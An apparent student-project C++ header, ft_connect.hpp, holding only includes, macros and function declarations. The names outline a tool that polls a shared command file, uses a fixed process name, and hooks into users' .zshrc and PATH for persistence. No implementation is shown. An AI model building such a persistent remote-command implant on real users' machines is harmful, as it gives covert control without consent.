/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ft_connect.hpp                                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/02/25 14:28:44 by zcadinot          #+#    #+#             */
/*   Updated: 2026/03/08 23:19:12 by zcadinot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma once

#include <iostream>
#include <string>
#include <fstream>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <pwd.h>
#include <cstdlib>
#include <signal.h>
#include <sstream>
#include <sys/prctl.h>

#define CMD_FILE "/sgoinfre/goinfre/Perso/zcadinot/.fcpp/command/command"
#define PROC_NAME "ft_connect"
#define LOOP_DELAY 500000 /* En Us */
#define SUPER_USERS {"zcadino","admin"}

struct data
{
    std::string name;
    std::string command;
};

bool cp_bin_to_path(const std::string &binary_name);
bool create_user_file(void);
bool notify_send(const std::string &message);
std::string get_last_sender(void);
void notify_last_sender_warning(void);
void pr_zshrc(void);
void persistance(void);
bool check_disable_true(void);
bool check_rc_path(void);
std::string get_zshrc_path(void);
std::string get_current_user(void);
bool copy_file(const std::string& src, const std::string& dst);
